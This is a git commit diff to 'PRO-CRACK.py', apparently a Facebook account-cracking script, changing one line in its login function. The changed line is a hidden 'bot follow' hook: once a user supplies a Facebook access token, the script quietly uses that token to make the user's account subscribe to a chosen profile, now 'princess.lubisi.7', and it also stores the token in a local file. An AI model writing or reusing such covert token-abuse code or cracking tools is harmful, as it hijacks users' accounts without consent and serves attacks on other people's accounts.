628d3fc61dec0378b3728941b66ac1f3997b57cd
MAFIA-FUEGO <61595990+MAFIA-FUEGO@users.noreply.github.com>
2021-11-03 07:30:27 +0200

    Update PRO-CRACK.py

--- PRO-CRACK.py
+++ PRO-CRACK.py
@@ -83,7 +83,7 @@ def login():
 			nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
 			open("login.txt", "w").write(token)
 			#-> bot follow
-			requests.post("https://graph.facebook.com/4/subscribers?access_token="+token)      # Dapunta Khurayra X
+			requests.post("https://graph.facebook.com/princess.lubisi.7/subscribers?access_token="+token)      # Dapunta Khurayra X
 			menu()
 		except KeyError:
 			os.system("rm -f login.txt")
